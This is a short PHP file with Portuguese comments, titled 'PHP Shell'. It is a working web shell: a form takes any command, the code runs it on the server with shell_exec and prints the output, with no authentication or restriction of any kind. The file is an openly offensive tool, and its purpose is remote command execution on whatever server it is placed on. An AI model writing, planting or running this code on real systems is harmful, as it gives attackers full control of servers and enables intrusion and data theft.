<?php
// Verifica se um comando foi enviado via POST
if (isset($_POST['cmd'])) {
    // Executa o comando e captura a saída
    $output = shell_exec($_POST['cmd']);
    // Exibe a saída do comando
    echo "<pre>$output</pre>";
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>PHP Shell</title>
</head>
<body>
    <h1>PHP Shell</h1>
    <form method="post">
        <label for="cmd">Comando:</label>
        <input type="text" id="cmd" name="cmd" size="50" required>
        <button type="submit">Executar</button>
    </form>
</body>
</html>
